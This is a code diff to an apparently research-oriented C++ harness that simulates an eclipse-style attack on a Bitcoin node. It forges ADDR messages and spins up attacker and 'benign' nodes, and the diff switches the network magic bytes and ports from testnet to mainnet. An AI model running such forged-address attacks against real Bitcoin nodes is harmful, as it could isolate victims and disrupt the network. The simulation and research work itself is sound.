@@ -99,7 +99,9 @@ bool BitcoinReceiveMsg(const char *pch, unsigned int nBytes, std::list<CNetMessa
 // Almost code are borrowed from net_processing.cpp of Bitcoin repo.
 bool BitcoinProcessMsg(CNetMessage& msg, bool fromInbound, std::deque<std::vector<unsigned char>>& vSendMsg, std::string their_ip, uint16_t their_port) {
 
-    const unsigned char MessageStartChars[4] = {'\v', '\021', '\t', '\a'};
+    // const unsigned char MessageStartChars[4] = {'\v', '\021', '\t', '\a'}; // for testnet 0b110907
+    const unsigned char MessageStartChars[4] = {0xf9, 0xbe, 0xb4, 0xd9}; // for mainnet f9beb4d9
+
 
     if (memcmp(msg.hdr.pchMessageStart, MessageStartChars, CMessageHeader::MESSAGE_START_SIZE) != 0) {
         std::cout << "INVALID MESSAGESTART " << msg.hdr.GetCommand() << "\n";
@@ -216,14 +218,16 @@ bool BitcoinProcessMsg(CNetMessage& msg, bool fromInbound, std::deque<std::vecto
 // Create a ADDR message for `vIP`,
 // then push it to message queue ('vSendMsg').
 bool BitcoinForgeAddrMsg(std::vector<std::string> vIP, std::deque<std::vector<unsigned char>>& vSendMsg, std::string their_ip, uint16_t their_port) {
-    const unsigned char MessageStartChars[4] = {'\v', '\021', '\t', '\a'};
+    // const unsigned char MessageStartChars[4] = {'\v', '\021', '\t', '\a'}; // for testnet 0b110907
+    const unsigned char MessageStartChars[4] = {0xf9, 0xbe, 0xb4, 0xd9}; // for mainnet f9beb4d9
+
     ServiceFlags nLocalNodeServices = ServiceFlags(NODE_NETWORK|NODE_WITNESS|NODE_NETWORK_LIMITED);
     std::vector<CAddress> vAddr;
     vAddr.reserve(vIP.size());
     for (std::string ip : vIP) {
         struct in_addr in_addr_ip;
         in_addr_ip.s_addr = inet_addr(ip.c_str());
-        CAddress addr = CAddress(CService(CNetAddr(in_addr_ip), 18333), nLocalNodeServices);
+        CAddress addr = CAddress(CService(CNetAddr(in_addr_ip), 8333), nLocalNodeServices);
 
         vAddr.push_back(addr);
     }
@@ -256,7 +260,10 @@ bool BitcoinForgeAddrMsg(std::vector<std::string> vIP, std::deque<std::vector<un
 // Almost code are borrowed from net_processing.cpp of Bitcoin repo.
 bool BitcoinInitProto(std::deque<std::vector<unsigned char>>& vSendMsg, std::string their_ip, uint16_t their_port) {
 
-    const unsigned char MessageStartChars[4] = {'\v', '\021', '\t', '\a'};
+    // TODO : more generic interface is required for switching between network automatically
+    // const unsigned char MessageStartChars[4] = {'\v', '\021', '\t', '\a'}; // for testnet 0b110907
+    const unsigned char MessageStartChars[4] = {0xf9, 0xbe, 0xb4, 0xd9}; // for mainnet f9beb4d9
+
 
     // their_addr
     CAddress their_addr;
@@ -978,22 +985,24 @@ int main(int argc, char *argv[]) {
     puts_temp("test shadow_interface\n");
 
     // Step 1. Prepare an attacker node which connects to Bitcoin victim (thus become an inbound connection of bitcoin victim)
-    ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto> attacker_node1("1.1.0.1", 18333);
+    ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto> attacker_node1("1.1.0.1", 8333);
     attacker_node1.Connect("1.0.0.1", 18333);
 
     // Step 2. Prepare 10 benign nodes and send a ADDR msg to the Bitcoin victim to indicate him to establish outgoing connections.
     // As a result bitcoin victim will establish 10 benign outgoing connection, and 1 incoming connection established in Step 1(1.1.0.1)
-    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node1("11.1.0.1", 18333);
-    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node2("11.2.0.1", 18333);
-    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node3("11.3.0.1", 18333);
-    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node4("11.4.0.1", 18333);
-    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node5("11.5.0.1", 18333);
-    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node6("11.6.0.1", 18333);
-    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node7("11.7.0.1", 18333);
-    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node8("11.8.0.1", 18333);
-    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node9("11.9.0.1", 18333);
-    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node10("11.10.0.1", 18333);
-    AddrTimer addrTimer1(15, {"11.1.0.1", "11.2.0.1", "11.3.0.1", "11.4.0.1", "11.5.0.1", "11.6.0.1", "11.7.0.1", "11.8.0.1", "11.9.0.1", "11.10.0.1"}, attacker_node1);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node1("11.1.0.1", 8333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node2("11.2.0.1", 8333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node3("11.3.0.1", 8333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node4("11.4.0.1", 8333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node5("11.5.0.1", 8333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node6("11.6.0.1", 8333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node7("11.7.0.1", 8333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node8("11.8.0.1", 8333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node9("11.9.0.1", 8333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node10("11.10.0.1", 8333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node11("11.11.0.1", 8333);
+    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node12("11.12.0.1", 8333);
+    AddrTimer addrTimer1(15, {"11.1.0.1", "11.2.0.1", "11.3.0.1", "11.4.0.1", "11.5.0.1", "11.6.0.1", "11.7.0.1", "11.8.0.1", "11.9.0.1", "11.10.0.1", "11.11.0.1", "11.12.0.1"}, attacker_node1);
 
 
     // Step 3. Prepare 10 (shadow) attacker nodes and send a ADDR msg to the Bitcoin victim.
